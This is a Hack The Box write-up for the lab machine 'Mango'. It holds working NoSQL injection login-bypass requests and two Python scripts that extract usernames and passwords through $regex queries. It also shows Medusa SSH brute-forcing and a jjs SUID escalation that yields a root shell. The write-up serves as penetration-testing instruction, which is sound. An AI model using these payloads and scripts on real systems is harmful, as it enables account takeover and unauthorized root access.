---
title: Mango HackTheBox writeup made by a dumb !!!
author: dumbx90
date: 2020-04-18 14:10:00 +0800
categories: [HTB, Writeup]
tags: [htb,pentest,linux,web,medium,retired,nosqli]
---

![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/mango-description.png?raw=true)



<script id="asciicast-WanlTaW7xEi3hQhsrsXUJu1NS" src="https://asciinema.org/a/WanlTaW7xEi3hQhsrsXUJu1NS.js" async></script>



## Disclaimer

This writeup is highly inspired in [Ippsec video](https://www.youtube.com/watch?v=NO_lsfhQK_s) . When I got root,  I did with a python script found in github. I not create my own. 



## Synopsis 

Mango is medium machine. In my opinion this machine is hard. We have to fuzz usernames and passwords using **NoSQLI** injection in the login page. After that we get a ssh shell. We move laterally to other user with password found in **NOSQLI** step. In the end we exploit a suid binary to get a root shell.

## Skills Necessary  

- Enumeration 
- Scripting 

## Skills Learned

- Python Web parser
- **NoSQLI** Injection


## Recon 

A simple nmap scan reveals a lot of open ports:

```bash
# Nmap 7.80 scan initiated Mon Apr 13 00:01:17 2020 as: nmap -sC -sV -p22,80,443 -oA nmap-all-10.10.10.162 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up (0.13s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr 13 00:01:39 2020 -- 1 IP address (1 host up) scanned in 22.13 seconds
```

In the **nmap** output we have a lot information. For the moment keep in mind that machine is leaked the host name-: **staging-order.mango.htb**. So I put in **/etc/hosts** the names of **staging-order.mango.htb** and **mango.htb** .  

Lets check the web page:

## Web Page 

![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/mango-admin-portal.png?raw=true)


****
The first thing we try is sqli injection with burp but not work So I come back and learn something about NoSQLI injection. 

## NoSQL 101 for dumbs

Basic in NoSQL keep the data in a variety of formats beside the table columns of **RDBMS**  databases. The value can be in pair key-value , Columns-Family, Graphs and documents.  They are high scalable and used for a huge volume of data. In term of time response they are faster than traditional **RDBMS** model.



## Understanding NoSQLI 

After some default credentials failed to log in, lets understating how the application deal with  it. Lets fireup burp and intercept the request:

![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/mango-burp-login-field.png?raw=true)

So like a **SQL**  traditional  the php send the login parameters (username and password) in a post.  The operator **$ne** is in for ****NoSQLI**** like **single quotes**  is in for **SQLI** .  How the php handle with the **NoSQL** query is the key to bypass the login portal.

In the client side  we see a post with username and password. In the server side, the **NoSQL** database, deal with this way:

```bash
$user->find_name(array(
	"username" == "$user"
));
$pass->find_password(array(
	"password" == "$password"
));

```

After a bit of research in this [links](##Reference-Links) I can understanding how deal with that. The site is running php, so we can use **Type Juggling**. This can be done send a **"[]"**  which makes **PHP** interpret and use them like a array. Why that is so important ? Because can be used to  bypass authentication mechanism, if the code of this comparison have some failure:

```php
POST / HTTP/1.1
Host: staging-order.mango.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://staging-order.mango.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Connection: close
Cookie: PHPSESSID=mhjjgas0rehghidc43tabutvin
Upgrade-Insecure-Requests: 1

username[]=admin&password[]=admin&login=login
```

We send a **array** to application and not receive anything different as usual. Now we make a use of **$ne**. This operator is used to **mango db** to compare values. So lets try it:

```php
POST / HTTP/1.1
Host: staging-order.mango.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://staging-order.mango.htb/
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Connection: close
Cookie: PHPSESSID=mhjjgas0rehghidc43tabutvin
Upgrade-Insecure-Requests: 1

username=admin&password[$ne]=admin&login=login
```



```php
HTTP/1.1 302 Found
Date: Fri, 24 Apr 2020 22:50:29 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: home.php
Content-Length: 4022
Connection: close
Content-Type: text/html; charset=UTF-8

```

So, we achieve a 302 code. 

![](https://github.com/dumbx90/dumbx90.github.io/blob/master/assets/img/commons/hackthebox/mango-bypass-login.png?raw=true)



##  Web Python Parser 101 for dumbs

For now we achieve a **NoSQLI** injection but this not give us anything to useful in your path to pop a shell. For this task we use python script to fuzz the username and passwords. The main idea is use the  **$regex** operator to ex filtrate data:

```php
POST /index.php HTTP/1.1
Host: staging-order.mango.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://staging-order.mango.htb/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 52
Connection: close
Cookie: PHPSESSID=mhjjgas0rehghidc43tabutvin
Upgrade-Insecure-Requests: 1

username[$regex]=a.*&password[$ne]=admin&login=login
```

The username and password sentence ca be translated this way - " If have a user that beginning with letter 'a' and the password not equal  ```admin```. Sent this we receive a 302 code (redirect):

```php
HTTP/1.1 302 Found
Date: Sat, 25 Apr 2020 00:29:03 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: home.php
Content-Length: 4022
Connection: close
Content-Type: text/html; charset=UTF-8
```

If we change the the request wit user name to something like that :

```php
username[$regex]=b.*&password[$ne]=admin&login=login
```

We get a 200 code response instead of 302.  This particular behavior can be exploited to discovery the name of users and the passwords. Lets code one python script to enumerate  users:

#### enum-user.py  

```python
#!/usr/bin/python3

from requests import post
from string import ascii_lowercase

url = "http://staging-order.mango.htb/"

def sendrequest(data):

    
    # to debug send the request to proxy
    #r=post(url,data=data, allow_redirects=False,proxies={'http':'localhost:8080'})
    
    r=post(url , data=data, allow_redirects=False)
    if r.status_code == 302: # status code that equal to bypass portal login
        return True
    
def payload():
    

    for  c in ascii_lowercase: # external loop , the first letter wil be a, second b ...

        username = c
        payload = c

        while True: # NEVER DO THAT IN REAL WORLD PROGRAMMING

            charset = " " + ascii_lowercase # space + lowercases

            for c in charset: # internal loop, in the first time the string payload = 'a '

                payload=username + c
                print("\r"+payload,flush=False,end="")

                data={"username[$regex]":payload+".*","password[$ne]":"admin","login":"login"}

                if sendrequest(data):
                
                    print("\r"+payload,flush=True,end="")
                    username = username + c  # save the string witch match to satus code
                    break
            
            # to leave while true
            data={"username[$regex]":payload + "$","password[$ne]":"admin","login":"login"}
            
            if sendrequest(data):
                break
            
            # to leave when internal loop achieve the last letter that is z
            if c == 'z':
                break
        print(" ")
  
def main():
    payload()

if __name__ == "__main__":
    main()    

```



When we run this  script, we get the usernames:

```bash
dumbland () hgfs/hackthebox/mango :: python3 exploit.py
admin
---------------------SNIP -------------------------------------------------------------
hz
in
jz
kz
lz
mango
ngo
---------------------SNIP -------------------------------------------------------------
```

Now we know the users ```admin``` and  ```mango```  exist. Its time to repeat the same process to found passwords:

#### enum-pass.py

````bash
#!/usr/bin/python3

from requests import post
from string import *

url = "http://staging-order.mango.htb/"

def sendrequest(data):

    
    # to debug send the request to proxy
    #r=post(url,data=data, allow_redirects=False,proxies={'http':'localhost:8080'})
    
    r=post(url , data=data, allow_redirects=False)
    if r.status_code == 302: # status code that equal to bypass portal login
        return True
    
def payload():
    

    for  c in printable: # external loop , the first letter wil be a, second b ...

        password = c
        payload = c

        while True: # NEVER DO THAT IN REAL WORLD PROGRAMMING

            charset = " " + printable # space + lowercases

            for c in charset: # internal loop, in the first time the string payload = 'a '
                
                if c in [ "^" , "$"  ,"|" , "\\", ".", "~", "{" , "}" , "[", "]","*", "+" , "?"]:
                    payload=password + '\\' + c
                
                else:
                    payload=password  + c

                print("\r"+payload,flush=False,end="")
				
				# change the username to mango to found admin password
                data={"username[$ne]":"admin","password[$regex]":payload +".*","login":"login"}

                if sendrequest(data):
                    print("\r"+payload,flush=True,end="")
                    password +=   c  # save the string witch match to satus code
                    break
            
            # to leave while true
            # change the username to mango to found admin password
            data={"username[$ne]":"admin","password[$regex]":payload +"$","login":"login"}
            
            if sendrequest(data):
                break
            
            # to leave when internal loop achieve the last letter that is z
            if c == '\x0c':
                break
        print(" ")
  
def main():
    payload()

if __name__ == "__main__":
    main() 
````



After execute this script following the instructions in comments we  have two passwords:

```h3mXK8RhU~f{]f5H```  and  ```t9KcS3>!0B#2```



## Initial Shell 

 With the usernames and password, we create two lists : ```username``` and ```passwords.txt```.  We use boot with Medusa to brute force the ssh service: 

```bash
dumbland () hgfs/hackthebox/mango :: cat usernames.txt
admin
mango
dumbland () hgfs/hackthebox/mango :: cat passwords.txt
h3mXK8RhU~f{]f5H
t9KcS3>!0B#2
```

```bash
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ssh] Host: 10.10.10.162 (1 of 1, 0 complete) User: admin (1 of 2, 0 complete) Password: h3mXK8RhU~f{]f5H (1 of 2 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.10.162 (1 of 1, 0 complete) User: admin (1 of 2, 0 complete) Password: t9KcS3>!0B#2 (2 of 2 complete)
ACCOUNT CHECK: [ssh] Host: 10.10.10.162 (1 of 1, 0 complete) User: mango (2 of 2, 1 complete) Password: h3mXK8RhU~f{]f5H (1 of 2 complete)
ACCOUNT FOUND: [ssh] Host: 10.10.10.162 User: mango Password: h3mXK8RhU~f{]f5H [SUCCESS]
```

After this hole process we reach one credential: ```mango:h3mXK8RhU~f{]f5H``` :

```bash
dumbland () hgfs/hackthebox/mango :: ssh mango@10.10.10.162
mango@10.10.10.162's password:
----------------------------------SNIP-------------------------------------------------
mango@mango:~$
```



## Priv Escalation 

This took more time I expect because I don't follow the  two ```rules of dumb ```:

1. Always try ever password we have in other users
2. Never, ever trust 100% in output of any tool

So after run **linpeas** and lookup for passwords and other paths to get a root shell, I realize that I have one password and there is a user named ```admin```  . Sou let try:

```bash
mango@mango:~$
mango@mango:~$ su - admin
Password:
$ id
uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
```

```bash
admin@mango:/$ find / -perm -4000 2> /dev/null
/bin/fusermount
/bin/mount
/bin/umount
/bin/su
/bin/ping
--------------------------SNIP---------------------------------------------------------
/usr/bin/newgidmap
/usr/bin/run-mailcap
--------------------------SNIP---------------------------------------------------------
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
admin@mango:/
```

 According to [GTFOBins](#reference-links)  the ``` /usr/bin/run-mailcap ``` and ``` jjs``` can be used to get a shell root. Lets do that. We execute ```jjs``` and inside that we run this to commands : The first one will copy ```sh```  to ```/tmp``` and the second one will give **suid** to binary.  Fell free if want to try a reverse shell:

```java
Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/sh /tmp/sh').waitFor()
Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /tmp/sh').waitFor()
```

```bash
admin@mango:/$ jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('cp /bin/sh /tmp/sh').waitFor()
0
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /tmp/sh').waitFor()
```



```bash
admin@mango:/tmp$ /tmp/sh -p
# id
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
# ls /root/
root.txt
#
```



## Tools used in this post

- Python3
- Burp
- Medusa - https://github.com/jmk-foofus/medusa

## Terminal Customization 

- https://eugeny.github.io/terminus/

- https://ohmyz.sh/ (afowler theme)

- https://github.com/samoshkin/tmux-config

  

## Reference Links

- https://www.mongodb.com/nosql-explained
- https://en.wikipedia.org/wiki/NoSQL
- https://medium.com/@fiddlycookie/nosql-injection-8732c2140576
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
- https://gtfobins.github.io/
- https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration.git


